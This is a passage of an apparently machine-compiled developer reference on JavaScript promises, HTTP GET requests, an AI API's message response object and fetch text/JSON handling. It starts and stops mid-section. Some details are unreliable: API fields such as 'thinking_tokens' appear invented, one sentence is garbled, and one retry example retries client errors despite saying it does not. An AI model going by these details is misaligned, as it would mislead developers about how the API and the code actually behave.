Each promise allocates memory for state tracking, result storage, and handler queues. [Inference] Promise creation involves allocating objects for the promise itself and its resolver functions. Long promise chains create proportional memory pressure as each `.then()` generates a new promise object.

Handler queues grow with the number of attached callbacks. A single promise with many observers stores references to all handlers until settlement, after which handler references typically clear to allow garbage collection.

#### Microtask Queue Architecture

Promise handlers execute on the microtask queue, which processes between regular task execution. [Inference] When a promise settles, its handlers enqueue as microtasks. The event loop drains all microtasks before proceeding to the next task, ensuring promise handlers run before I/O callbacks or timers.

This guarantees that promise chains execute without interleaving from other asynchronous operations:

```javascript
Promise.resolve().then(() => console.log('Microtask 1'));
Promise.resolve().then(() => console.log('Microtask 2'));
setTimeout(() => console.log('Task'), 0);

// Output order: Microtask 1, Microtask 2, Task
// Microtasks drain completely before timer task executes
```

The microtask queue prioritization affects performance - long microtask sequences can delay rendering or I/O processing.

#### Promise Chain Optimization

Long chains can optimize through combination:

```javascript
// Multiple promise creations
fetch(url)
  .then(r => r.json())
  .then(data => data.users)
  .then(users => users[0]);

// Reduced allocations
fetch(url)
  .then(r => r.json())
  .then(data => data.users[0]);
```

Combining operations in single handlers reduces intermediate promise allocations. However, this trades allocation cost for handler complexity - balance depends on performance requirements.

#### Lazy Promise Execution

Promises execute immediately upon creation. [Inference] The executor function passed to `new Promise()` runs synchronously before the constructor returns:

```javascript
console.log('Before');
new Promise((resolve) => {
  console.log('Executor runs immediately');
  resolve();
});
console.log('After');

// Output: Before, Executor runs immediately, After
```

This differs from lazy evaluation patterns. For deferred execution, wrap promise creation in functions:

```javascript
function lazyOperation() {
  return new Promise((resolve) => {
    // Executor runs when function called, not when defined
    expensiveOperation();
    resolve();
  });
}

const operation = lazyOperation; // No execution yet
const promise = operation();     // Execution begins
```

### Cancellation and Resource Management

#### Promise Cancellation Challenges

Standard promises lack built-in cancellation. Once created, a promise continues until settlement. [Inference] This design choice stems from promise state immutability - cancellation would require a fourth state or special rejection handling, complicating the state model.

External cancellation requires coordination mechanisms:

```javascript
function cancellableOperation(signal) {
  return new Promise((resolve, reject) => {
    if (signal.aborted) {
      reject(new Error('Aborted'));
      return;
    }
    
    signal.addEventListener('abort', () => {
      reject(new Error('Aborted'));
    });
    
    performOperation().then(resolve);
  });
}

const controller = new AbortController();
const promise = cancellableOperation(controller.signal);

// Cancel the operation
controller.abort();
```

This pattern checks cancellation state externally rather than modifying promise internals.

#### Resource Cleanup Patterns

Promises don't provide cleanup hooks like `finally` does guaranteed cleanup:

```javascript
let resource;
openResource()
  .then(r => {
    resource = r;
    return processResource(resource);
  })
  .finally(() => {
    if (resource) {
      resource.close();
    }
  });
```

The `finally` handler executes regardless of fulfillment or rejection, enabling cleanup. However, it doesn't receive the settled value, preventing value-dependent cleanup logic.

For complex resource management, explicit patterns handle acquisition and release:

```javascript
async function withResource(resourceId, handler) {
  const resource = await acquireResource(resourceId);
  try {
    return await handler(resource);
  } finally {
    await releaseResource(resource);
  }
}

// Usage guarantees cleanup
await withResource('db-connection', async (conn) => {
  return conn.query('SELECT * FROM users');
});
```

### Integration Patterns

#### Promisification of Callback APIs

Legacy callback-based APIs convert to promises through wrapper functions:

```javascript
function promisify(callbackFn) {
  return function(...args) {
    return new Promise((resolve, reject) => {
      callbackFn(...args, (err, result) => {
        if (err) reject(err);
        else resolve(result);
      });
    });
  };
}

// Convert callback API
const readFileAsync = promisify(fs.readFile);
const contents = await readFileAsync('file.txt', 'utf8');
```

This pattern bridges callback conventions with promise architecture, enabling gradual migration of codebases.

#### Event-to-Promise Conversion

Single-occurrence events convert to promises for one-time asynchronous waiting:

```javascript
function waitForEvent(emitter, eventName, errorEvent = 'error') {
  return new Promise((resolve, reject) => {
    emitter.once(eventName, resolve);
    emitter.once(errorEvent, reject);
  });
}

// Usage waits for next occurrence
const result = await waitForEvent(socket, 'data');
```

This pattern suits scenarios where event represents completion rather than ongoing notifications.

#### Stream Processing Architecture

Promises integrate with streams through async iteration:

```javascript
async function processStream(stream) {
  for await (const chunk of stream) {
    await processChunk(chunk);
  }
}
```

Each iteration returns a promise that resolves with the next chunk, combining streaming and promise-based architectures. This enables backpressure handling where processing pauses until `processChunk` completes.

### Testing and Debugging Architecture

#### Promise Resolution Testing

Testing promise-based code requires waiting for settlement:

```javascript
test('async operation succeeds', async () => {
  const result = await asyncOperation();
  expect(result).toBe(expected);
});

// Or with explicit promise handling
test('async operation succeeds', () => {
  return asyncOperation().then(result => {
    expect(result).toBe(expected);
  });
});
```

Test frameworks recognize returned promises, waiting for settlement before concluding tests. Unhandled rejections cause test failures.

#### Rejection Testing Patterns

Testing error cases requires explicit rejection handling:

```javascript
test('operation rejects on invalid input', async () => {
  await expect(asyncOperation(invalidInput))
    .rejects
    .toThrow('Invalid input');
});

// Without async/await
test('operation rejects', () => {
  return asyncOperation().then(
    () => { throw new Error('Should have rejected'); },
    err => { expect(err.message).toBe('Expected error'); }
  );
});
```

The testing pattern inverts normal control flow - rejections become expected outcomes rather than failures.

#### Promise State Inspection

[Inference] Debugging often requires understanding promise state, but promises don't expose state inspection methods. Development tools provide promise state visualization, showing pending/fulfilled/rejected status and resolved values in debugger interfaces.

For programmatic inspection during testing, wrapper patterns track state:

```javascript
class InspectablePromise extends Promise {
  constructor(executor) {
    super((resolve, reject) => {
      this._state = 'pending';
      executor(
        value => { this._state = 'fulfilled'; resolve(value); },
        reason => { this._state = 'rejected'; reject(reason); }
      );
    });
  }
  
  getState() { return this._state; }
}
```

[Unverified] This approach may not work consistently across all environments due to promise subclassing limitations.

#### Timing and Race Condition Testing

Asynchronous timing creates test challenges. Deterministic testing requires controlling promise resolution order:

```javascript
function createControllablePromise() {
  let resolve, reject;
  const promise = new Promise((res, rej) => {
    resolve = res;
    reject = rej;
  });
  return { promise, resolve, reject };
}

test('handles race condition correctly', async () => {
  const { promise: p1, resolve: r1 } = createControllablePromise();
  const { promise: p2, resolve: r2 } = createControllablePromise();
  
  const result = Promise.race([p1, p2]);
  
  r2('second'); // Control which resolves first
  r1('first');
  
  expect(await result).toBe('second');
});
```

This pattern eliminates timing non-determinism by manually controlling resolution order.

---

## Basic GET Requests

### Request Structure

A GET request consists of a request line, headers, and an empty body. The request line contains the method (GET), the target URI, and the HTTP version.

```
GET /api/users/123 HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0
Accept: application/json
```

The URI may include a path, query parameters, and fragment identifier. Query parameters follow the `?` delimiter and use `&` to separate multiple parameters.

```
GET /search?q=javascript&category=tutorials&page=2 HTTP/1.1
```

### Query Parameters

Query parameters encode data in the URL using key-value pairs. Special characters require percent-encoding (URL encoding) to maintain URI validity.

```
/search?name=John%20Doe&email=user%40example.com
```

Common encoding rules:

- Space: `%20` or `+`
- `@`: `%40`
- `#`: `%23`
- `&`: `%26`
- `=`: `%3D`

### Headers

Request headers provide metadata about the request, client capabilities, and authentication credentials.

**Common GET request headers:**

- `Host`: Target server domain (required in HTTP/1.1)
- `Accept`: Media types the client can process
- `Accept-Language`: Preferred response language
- `Accept-Encoding`: Supported compression methods (gzip, deflate, br)
- `User-Agent`: Client application identifier
- `Authorization`: Authentication credentials
- `Cookie`: Stored cookies for the domain
- `Cache-Control`: Caching directives
- `If-None-Match`: ETag for conditional requests
- `If-Modified-Since`: Timestamp for conditional requests
- `Referer`: Previous page URL
- `Connection`: Connection management (keep-alive, close)

### Response Structure

The server responds with a status line, headers, and optional body content.

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 157
Cache-Control: max-age=3600
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"

{"id": 123, "name": "John Doe", "email": "john@example.com"}
```

### Status Codes for GET Requests

**2xx Success:**

- `200 OK`: Request succeeded, response body contains requested resource
- `204 No Content`: Request succeeded, no response body

**3xx Redirection:**

- `301 Moved Permanently`: Resource permanently relocated
- `302 Found`: Resource temporarily relocated
- `304 Not Modified`: Cached version is still valid

**4xx Client Errors:**

- `400 Bad Request`: Malformed syntax or invalid parameters
- `401 Unauthorized`: Authentication required
- `403 Forbidden`: Access denied despite authentication
- `404 Not Found`: Resource does not exist
- `405 Method Not Allowed`: GET not supported for this resource
- `429 Too Many Requests`: Rate limit exceeded

**5xx Server Errors:**

- `500 Internal Server Error`: Unhandled server exception
- `502 Bad Gateway`: Invalid response from upstream server
- `503 Service Unavailable`: Server temporarily cannot handle request
- `504 Gateway Timeout`: Upstream server timeout

### Idempotency and Safety

GET requests are both safe and idempotent:

- **Safe**: The request does not modify server state
- **Idempotent**: Multiple identical requests produce the same result

[Inference] This design principle guides caching strategies and retry logic, though actual implementation depends on server-side code respecting REST conventions.

### Caching Behavior

GET responses are cacheable by default. Servers control caching through headers:

```
Cache-Control: public, max-age=3600
Cache-Control: private, no-cache
Cache-Control: no-store
```

**Conditional requests** reduce bandwidth by validating cached content:

```
GET /api/users/123 HTTP/1.1
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

If content hasn't changed, the server responds with `304 Not Modified` without a body.

### Content Negotiation

Clients specify preferred response formats through `Accept` headers:

```
Accept: application/json
Accept: text/html, application/xml;q=0.9, */*;q=0.8
```

Quality values (q) indicate preference order. Servers respond with `Content-Type` indicating the actual format:

```
Content-Type: application/json; charset=utf-8
```

If the server cannot provide an acceptable format, it responds with `406 Not Acceptable`.

### Query String Length Limits

While HTTP specification doesn't define maximum URL length, practical limits exist:

- Most browsers: 2,000+ characters
- Web servers: Varies (Apache: 8,190 bytes default, Nginx: 4,096-8,192 bytes)
- Proxies and CDNs: May impose stricter limits

[Inference] For large datasets, POST requests with body content become preferable, though this represents a design choice rather than a protocol requirement.

### CORS Preflight

Cross-origin GET requests with custom headers trigger preflight OPTIONS requests:

```
OPTIONS /api/users HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: X-Custom-Header
```

Simple GET requests (standard headers only) proceed without preflight.

### Authentication Patterns

**Bearer Token:**

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Basic Authentication:**

```
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

**API Key:**

```
X-API-Key: abc123def456
```

Or via query parameter:

```
GET /api/users?api_key=abc123def456
```

### Connection Management

HTTP/1.1 uses persistent connections by default:

```
Connection: keep-alive
Keep-Alive: timeout=5, max=100
```

The connection remains open for subsequent requests, reducing TCP handshake overhead.

HTTP/2 multiplexes multiple requests over a single connection, eliminating the need for explicit connection management headers.

### Compression

Clients indicate compression support:

```
Accept-Encoding: gzip, deflate, br
```

Servers compress response bodies when beneficial:

```
Content-Encoding: gzip
Content-Length: 1247
```

The `Content-Length` reflects compressed size. Clients decompress transparently.

### Range Requests

Clients request partial content using byte ranges:

```
GET /video.mp4 HTTP/1.1
Range: bytes=0-1023
```

Server responds with `206 Partial Content`:

```
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/5000000
Content-Length: 1024
```

This enables resumable downloads and streaming media.

### Performance Considerations

**DNS Resolution**: Domain lookup adds latency; DNS caching reduces subsequent requests.

**TCP Handshake**: Three-way handshake adds round-trip time; connection reuse mitigates this.

**TLS Negotiation**: HTTPS adds cryptographic handshake; session resumption reduces overhead.

**Server Processing**: Backend queries, database access, and business logic execution time.

**Network Latency**: Physical distance between client and server affects transfer time.

**Response Size**: Larger payloads increase transfer time; compression and pagination help.

### Error Handling Patterns

Clients should implement retry logic with exponential backoff for transient failures (5xx errors, timeouts). Permanent failures (4xx errors except 429) should not retry.

```javascript
// Example pattern (not production code)
async function getWithRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      if (response.ok) return response;
      if (response.status >= 400 && response.status < 500) {
        throw new Error('Client error');
      }
      // Retry on 5xx
      await sleep(Math.pow(2, i) * 1000);
    } catch (error) {
      if (i === maxRetries - 1) throw error;
    }
  }
}
```

[Unverified] Specific retry strategies depend on application requirements and server tolerance for repeated requests.

---

## Response Object Structure

### Core Response Envelope

The response object wraps all return data from API endpoints in a consistent envelope structure. The outer shell contains metadata about the request execution, while the nested content array holds the actual response data.

```json
{
  "id": "msg_01XYZ...",
  "type": "message",
  "role": "assistant",
  "model": "claude-sonnet-4-20250514",
  "content": [...],
  "stop_reason": "end_turn",
  "stop_sequence": null,
  "usage": {...}
}
```

### Content Array Architecture

The content array is polymorphic, supporting multiple block types that can be intermixed within a single response. Each block contains a `type` discriminator that determines its structure.

#### Text Blocks

The fundamental response unit carrying natural language output:

```json
{
  "type": "text",
  "text": "The actual response content here..."
}
```

Text blocks may contain markdown formatting, code blocks, or plain text depending on the model's generation choices. Multiple text blocks can appear when the model alternates between text generation and tool use.

#### Tool Use Blocks

Structured requests for function execution:

```json
{
  "type": "tool_use",
  "id": "toolu_01ABC...",
  "name": "function_name",
  "input": {
    "param1": "value1",
    "param2": "value2"
  }
}
```

The `id` field uniquely identifies this tool invocation for matching with subsequent tool result submissions. The `input` object structure is validated against the tool's JSON schema definition provided in the request.

#### Thinking Blocks

Extended reasoning chains when extended thinking is enabled:

```json
{
  "type": "thinking",
  "thinking": "Internal reasoning process..."
}
```

These blocks expose the model's chain-of-thought reasoning before producing final outputs. They're only present when the request includes thinking budget parameters.

### Stop Reason Enumeration

The `stop_reason` field indicates why generation terminated:

- **`end_turn`**: Natural completion where the model finished its response
- **`max_tokens`**: Generation hit the `max_tokens` limit before completion
- **`stop_sequence`**: Encountered a custom stop sequence from the request
- **`tool_use`**: Model produced tool calls and paused for tool result injection

When `stop_reason` is `"tool_use"`, the response expects a follow-up request containing tool results before generation can continue.

### Usage Metrics Object

Token consumption breakdown for billing and monitoring:

```json
{
  "input_tokens": 2048,
  "output_tokens": 512,
  "cache_creation_input_tokens": 0,
  "cache_read_input_tokens": 0
}
```

#### Token Counting Semantics

- **`input_tokens`**: All prompt tokens processed, including system prompts, conversation history, and tool definitions
- **`output_tokens`**: Tokens generated in the response content array
- **`cache_creation_input_tokens`**: Tokens written to prompt cache on this request
- **`cache_read_input_tokens`**: Tokens retrieved from prompt cache, charged at reduced rate

Cache tokens are only populated when prompt caching is enabled and cache control markers are present in the request.

### Streaming Response Variants

#### Event Stream Structure

Streaming responses use Server-Sent Events (SSE) format with typed event chunks:

```
event: message_start
data: {"type":"message_start","message":{...}}

event: content_block_start
data: {"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}

event: content_block_delta
data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hello"}}

event: content_block_stop
data: {"type":"content_block_stop","index":0}

event: message_delta
data: {"type":"message_delta","delta":{"stop_reason":"end_turn"},"usage":{...}}

event: message_stop
data: {"type":"message_stop"}
```

#### Delta Objects

Content deltas contain incremental additions to blocks:

```json
{
  "type": "text_delta",
  "text": "incremental tokens"
}
```

For tool use blocks, the input field streams as partial JSON:

```json
{
  "type": "input_json_delta",
  "partial_json": "{\"param\": \"val"
}
```

Clients must accumulate deltas to reconstruct complete blocks. JSON deltas may contain incomplete syntax until the `content_block_stop` event signals completion.

### Error Response Structure

Errors replace the standard response envelope with a distinct structure:

```json
{
  "type": "error",
  "error": {
    "type": "invalid_request_error",
    "message": "Detailed error description"
  }
}
```

#### Error Type Taxonomy

- **`invalid_request_error`**: Malformed request syntax or schema violations
- **`authentication_error`**: Missing or invalid API key
- **`permission_error`**: Valid credentials lack required access
- **`not_found_error`**: Requested resource doesn't exist
- **`rate_limit_error`**: Request exceeds rate limiting quotas
- **`api_error`**: Internal server errors or model failures
- **`overloaded_error`**: Service temporarily unavailable due to capacity

Rate limit errors include additional fields for quota management:

```json
{
  "type": "error",
  "error": {
    "type": "rate_limit_error",
    "message": "Rate limit exceeded",
    "retry_after": 30
  }
}
```

### Multi-Turn Conversation Continuity

Response IDs enable conversation threading and analytics correlation:

```json
{
  "id": "msg_01XYZ...",
  ...
}
```

These IDs are opaque identifiers unique per message generation. They should be logged for debugging but not parsed or relied upon for semantic meaning.

### Model Metadata Fields

The `model` field echoes the exact model identifier that processed the request:

```json
{
  "model": "claude-sonnet-4-20250514"
}
```

This may differ from the requested model if aliasing or fallback logic is applied. The returned value represents the actual inference engine used.

### Stop Sequence Matching

When a custom stop sequence triggers termination, the `stop_sequence` field contains the matched string:

```json
{
  "stop_reason": "stop_sequence",
  "stop_sequence": "\n\nHuman:"
}
```

The matched sequence is excluded from the final text block content. Multiple stop sequences can be provided in requests, but only one can match per generation.

### Content Block Ordering Guarantees

Content blocks maintain strict generation order within the array. Tool use blocks always appear after any text explaining the tool call rationale, never before.

When multiple tool calls occur, they appear sequentially in the order the model decided to invoke them:

```json
{
  "content": [
    {"type": "text", "text": "I'll search for that information..."},
    {"type": "tool_use", "id": "toolu_01", "name": "search", "input": {...}},
    {"type": "tool_use", "id": "toolu_02", "name": "fetch", "input": {...}}
  ]
}
```

### Role Field Semantics

The `role` field is always `"assistant"` in response objects, distinguishing model outputs from user messages in conversation history construction.

### Extended Thinking Token Accounting

When extended thinking is active, thinking tokens are tracked separately in usage metrics:

```json
{
  "usage": {
    "input_tokens": 2048,
    "output_tokens": 512,
    "thinking_tokens": 8192
  }
}
```

Thinking tokens are charged at standard output rates but represent internal reasoning not visible to users unless thinking blocks are explicitly enabled.

### Prompt Caching Interaction

Response objects reflect cache behavior through specialized usage fields. On cache miss, `cache_creation_input_tokens` shows tokens written to cache. Subsequent requests with matching cache prefixes populate `cache_read_input_tokens`.

Cache keys are derived from prompt content hashes, making cache hits deterministic for identical input prefixes. TTL is 5 minutes, after which cached content expires and requires recreation.

### Type Safety Considerations

The `type` discriminator enables type-safe parsing in strongly-typed languages:

```typescript
type ContentBlock = 
  | { type: "text", text: string }
  | { type: "tool_use", id: string, name: string, input: Record<string, unknown> }
  | { type: "thinking", thinking: string };
```

Clients should validate the `type` field before accessing type-specific properties to avoid runtime errors on future block type additions.

---

## Text Response Handling (Fetch Context)

### Stream Processing and Accumulation

Text responses from fetch operations typically arrive as streams that require progressive accumulation. The fundamental pattern involves collecting chunks as they arrive and maintaining state throughout the streaming process.

**Chunk Accumulation**: Responses arrive in fragments that must be concatenated in sequence. Each chunk represents a partial payload that contributes to the complete response body. The accumulation buffer grows progressively until the stream signals completion.

**Encoding Considerations**: Text streams may arrive in various encodings (UTF-8, UTF-16, ASCII). The decoder must match the declared content encoding from response headers. Mismatched encoding causes corruption of multi-byte characters, particularly affecting non-ASCII content.

### Response Object Structure

Fetch responses expose text content through multiple interfaces, each with distinct characteristics:

**text() Method**: Returns a promise that resolves to the complete response body as a string. This method consumes the entire stream and performs automatic encoding detection based on Content-Type headers. The body stream can only be read once - subsequent calls to text() will fail because the stream has been consumed.

**Body Stream Access**: The response.body property provides a ReadableStream that enables chunk-by-chunk processing before the complete response arrives. This allows progressive rendering and memory-efficient handling of large payloads.

```javascript
const response = await fetch(url);
const reader = response.body.getReader();
const decoder = new TextDecoder();

let accumulated = '';
while (true) {
  const {done, value} = await reader.read();
  if (done) break;
  accumulated += decoder.decode(value, {stream: true});
}
```

### Error State Management

**Network Failures**: Fetch rejects its promise for network-level failures (DNS resolution, connection refused, timeout). The response object never materializes in these scenarios - error handling must occur at the promise catch level.

**HTTP Error Status**: Successful fetch resolution doesn't indicate successful HTTP transactions. Status codes 4xx and 5xx resolve normally - the response object exists but represents an error state. Status validation requires explicit checking:

```javascript
if (!response.ok) {
  const errorText = await response.text();
  throw new Error(`HTTP ${response.status}: ${errorText}`);
}
```

**Partial Response Handling**: Stream interruptions mid-transfer create incomplete text responses. The accumulated content may be syntactically invalid (truncated JSON, incomplete HTML). Validation must occur after accumulation completes.

### Content-Type Processing

**MIME Type Inspection**: The Content-Type header dictates expected response format. Text responses may declare charset encoding: `text/html; charset=utf-8`. This informs decoder selection and parsing strategy.

**JSON Response Handling**: Despite being text-based, JSON requires post-processing. The json() method provides integrated parsing:

```javascript
const data = await response.json();  // Combines text() + JSON.parse()
```

Manual text extraction followed by JSON.parse() provides identical functionality with explicit error control over parsing failures.

### Large Response Strategies

**Progressive Processing**: For responses exceeding memory constraints, stream processing prevents buffer overflow. Each chunk undergoes immediate processing before the next arrives, maintaining constant memory usage regardless of total response size.

**Backpressure Management**: [Inference] When processing cannot keep pace with incoming chunks, backpressure mechanisms should signal the stream to pause delivery. The ReadableStream API supports this through reader.read() promise timing - slow consumption naturally applies backpressure.

**Line-Based Processing**: Text responses with line-delimited records (logs, CSV, NDJSON) benefit from line-oriented accumulation:

```javascript
let buffer = '';
const lines = [];

// For each chunk
buffer += chunkText;
const lineBreakIndex = buffer.lastIndexOf('\n');
if (lineBreakIndex !== -1) {
  const completeLines = buffer.substring(0, lineBreakIndex);
  buffer = buffer.substring(lineBreakIndex + 1);
  lines.push(...completeLines.split('\n'));
}
```

### Character Boundary Handling

Multi-byte character sequences may split across chunk boundaries. UTF-8 characters span 1-4 bytes, and a chunk might terminate mid-character.

**TextDecoder Stream Mode**: The {stream: true} option instructs the decoder to retain incomplete character bytes across decode() calls:

```javascript
decoder.decode(chunk, {stream: true});  // Preserves incomplete sequences
decoder.decode(finalChunk);  // stream: false (default) for final chunk
```

Without stream mode, truncated multi-byte sequences decode to replacement characters (�).

### Response Cloning

The response.clone() method creates an independent copy that allows multiple consumption strategies:

```javascript
const response = await fetch(url);
const clone = response.clone();

const text = await response.text();  // Consumes original
const json = await clone.json();      // Consumes clone independently
```

[Inference] Cloning duplicates the underlying stream, enabling parallel or sequential processing with different methods. This incurs memory overhead proportional to response size.

### Abort and Timeout Handling

**AbortController Integration**: Fetch accepts an abort signal that terminates in-progress requests:

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch(url, {signal: controller.signal});
  const text = await response.text();
} catch (err) {
  if (err.name === 'AbortError') {
    // Request was aborted
  }
} finally {
  clearTimeout(timeoutId);
}
```

Aborting during text() consumption terminates stream reading and rejects the promise.

### Memory Management

**Garbage Collection Dependencies**: [Inference] Response objects and their streams remain in memory until fully consumed or explicitly abandoned. Unread streams may prevent garbage collection of the response object and associated network resources.

**Large Text Accumulation**: Complete text extraction via text() loads the entire response into memory as a string. For multi-megabyte responses, this creates memory pressure and potential performance degradation from large string allocations.

### Binary vs Text Distinction

Fetch provides blob() and arrayBuffer() methods for binary content. Using text() on binary responses produces mojibake - the bytes get interpreted as character codes. Content-Type inspection should determine the appropriate extraction method.

**Base64-Encoded Text**: Some APIs return binary data encoded as base64 text. This requires text extraction followed by base64 decoding:

```javascript
const base64Text = await response.text();
const binaryString = atob(base64Text);
const bytes = new Uint8Array(binaryString.length);
for (let i = 0; i < binaryString.length; i++) {
  bytes[i] = binaryString.charCodeAt(i);
}
```

### Compression Handling

**Automatic Decompression**: Browsers automatically decompress gzip and deflate responses when the Content-Encoding header indicates compression. The text() method operates on decompressed content transparently.

**Brotli Support**: [Unverified - browser-dependent] Modern browsers support brotli (br) encoding with automatic decompression. Older environments may not decompress brotli, delivering compressed bytes that fail text decoding.

### Cross-Origin Considerations

**Opaque Responses**: Cross-origin requests without CORS headers produce opaque responses (type: 'opaque'). Text extraction from opaque responses fails - the body is inaccessible for security reasons.

**CORS and Text Access**: Successful CORS negotiation (appropriate Access-Control-Allow-Origin headers) produces basic or cors-type responses that permit text extraction.

### Event-Driven Processing

For UI applications requiring incremental updates during long downloads:

```javascript
const response = await fetch(url);
const contentLength = response.headers.get('Content-Length');
const reader = response.body.getReader();

let receivedLength = 0;
let chunks = [];

while (true) {
  const {done, value} = await reader.read();
  if (done) break;
  
  chunks.push(value);
  receivedLength += value.length;
  
  const progress = contentLength ? (receivedLength / contentLength) * 100 : 0;
  updateProgressBar(progress);
}

const allChunks = new Uint8Array(receivedLength);
let position = 0;
for (const chunk of chunks) {
  allChunks.set(chunk, position);
  position += chunk.length;
}

const text = new TextDecoder().decode(allChunks);
```

[Inference] This pattern enables responsive UIs during data transfer but adds complexity compared to simple await response.text().

### Retry and Resilience

**Idempotency Requirements**: Text fetches should generally target idempotent endpoints for safe retry logic. POST requests with side effects require careful consideration before retry attempts.

**Exponential Backoff**: [Inference - common pattern but not standardized] Retry strategies often employ exponential delays between attempts:

```javascript
async function fetchWithRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      if (!response.ok && response.status >= 500) {
        throw new Error(`Server error: ${response.status}`);
      }
      return await response.text();
    } catch (err) {
      if (i === maxRetries - 1) throw err;
      await new Promise(resolve => setTimeout(resolve, Math.pow(2, i) * 1000));
    }
  }
}
```

**Partial Content Recovery**: [Speculation] Range requests could resume interrupted downloads, but this requires server support for byte-range requests and adds significant complexity to text response handling.

---

## JSON Response Handling in Fetch Context

### Response Object Structure

The `fetch()` API returns a Promise that resolves to a Response object. This Response object contains the raw HTTP response and requires explicit parsing to extract JSON data.

```javascript
const response = await fetch('https://api.example.com/data');
// response is a Response object, NOT the JSON data itself
const data = await response.json(); // Parsing step required
```

### The `.json()` Method

The `Response.json()` method reads the response stream to completion and parses it as JSON. Key characteristics:

- Returns a Promise that resolves to the parsed JavaScript object
- Can only be called once per Response (stream consumption)
- Throws on invalid JSON syntax
- Does not validate HTTP status codes

```javascript
fetch(url)
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Parse or network error:', error));
```

### Stream Consumption and Body Methods

Response bodies are readable streams that can only be consumed once. After calling `.json()`, `.text()`, `.blob()`, `.arrayBuffer()`, or `.formData()`, the body is locked and cannot be read again.

```javascript
const response = await fetch(url);
const data = await response.json(); // First consumption
const text = await response.text(); // ERROR: body already consumed
```

To read the same response multiple times, clone it:

```javascript
const response = await fetch(url);
const clone = response.clone();

const json = await response.json();
const text = await clone.text();
```

### Status Code Validation Pattern

**Critical point**: `fetch()` only rejects on network failures, not HTTP error status codes (4xx, 5xx). The `.json()` method proceeds regardless of status.

Standard pattern:

```javascript
const response = await fetch(url);

if (!response.ok) {
  throw new Error(`HTTP ${response.status}: ${response.statusText}`);
}

const data = await response.json();
```

Alternative with detailed error handling:

```javascript
const response = await fetch(url);

if (!response.ok) {
  // Attempt to parse error response
  let errorMessage = response.statusText;
  try {
    const errorData = await response.json();
    errorMessage = errorData.message || errorMessage;
  } catch (e) {
    // Response body wasn't JSON
  }
  throw new Error(`HTTP ${response.status}: ${errorMessage}`);
}

const data = await response.json();
```

### Handling Malformed JSON

`.json()` throws a `SyntaxError` when the response body isn't valid JSON:

```javascript
try {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`HTTP error: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
  
} catch (error) {
  if (error instanceof SyntaxError) {
    console.error('Invalid JSON received');
  } else if (error instanceof TypeError) {
    console.error('Network error or CORS issue');
  } else {
    console.error('Other error:', error.message);
  }
}
```

### Content-Type Validation

[Inference] The `.json()` method does not validate the `Content-Type` header—it attempts to parse any response body as JSON. For stricter handling:

```javascript
const response = await fetch(url);

const contentType = response.headers.get('content-type');
if (!contentType || !contentType.includes('application/json')) {
  throw new Error(`Expected JSON, got ${contentType}`);
}

const data = await response.json();
```

### Empty Response Bodies

Calling `.json()` on an empty response (204 No Content, empty body) throws a `SyntaxError`:

```javascript
const response = await fetch(url);

if (response.status === 204 || response.headers.get('content-length') === '0') {
  return null; // or appropriate default
}

const data = await response.json();
```

### Async/Await vs Promise Chaining

Both patterns are valid; async/await typically provides clearer error boundaries:

```javascript
// Promise chaining
fetch(url)
  .then(response => {
    if (!response.ok) throw new Error('HTTP error');
    return response.json();
  })
  .then(data => processData(data))
  .catch(error => handleError(error));

// Async/await (recommended for complex flows)
try {
  const response = await fetch(url);
  if (!response.ok) throw new Error('HTTP error');
  const data = await response.json();
  processData(data);
} catch (error) {
  handleError(error);
}
```

### Response Body Inspection Before Parsing

When debugging or handling uncertain response formats:

```javascript
const response = await fetch(url);
const text = await response.text();

console.log('Raw response:', text);

try {
  const data = JSON.parse(text);
  return data;
} catch (error) {
  console.error('Invalid JSON:', text);
  throw error;
}
```

### Streaming Large JSON Responses

For very large JSON responses, standard `.json()` loads the entire response into memory. For streaming parsing:

```javascript
const response = await fetch(url);
const reader = response.body.getReader();
const decoder = new TextDecoder();

let partialData = '';

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  
  partialData += decoder.decode(value, { stream: true });
  
  // Process chunks if possible (requires NDJSON or similar format)
}

const data = JSON.parse(partialData);
```

[Inference] True streaming JSON parsing requires libraries like `stream-json` or NDJSON format, as standard JSON cannot be parsed incrementally.

### Timeout Handling

`fetch()` has no built-in timeout. Use `AbortController`:

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch(url, { signal: controller.signal });
  clearTimeout(timeoutId);
  
  if (!response.ok) throw new Error('HTTP error');
  const data = await response.json();
  return data;
  
} catch (error) {
  if (error.name === 'AbortError') {
    console.error('Request timed out');
  }
  throw error;
}
```

### Type Safety Considerations

[Inference] `.json()` returns `Promise<any>` in TypeScript. Runtime validation is necessary:

```javascript
const response = await fetch(url);
const data = await response.json();

// Runtime validation (example with manual checks)
if (!data || typeof data.id !== 'number' || typeof data.name !== 'string') {
  throw new Error('Invalid response structure');
}

// Or use validation libraries (Zod, Yup, io-ts)
```

### Performance Optimization

The `.json()` method is synchronous JSON parsing wrapped in a Promise. For CPU-intensive parsing of large payloads:

```javascript
// Offload to worker (hypothetical pattern)
const response = await fetch(url);
const text = await response.text();
const data = await parseInWorker(text); // Custom worker implementation
```

[Inference] This provides minimal benefit for typical JSON sizes (<1MB) due to worker communication overhead.

### Complete Robust Pattern

```javascript
async function fetchJSON(url, options = {}) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), options.timeout || 10000);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: {
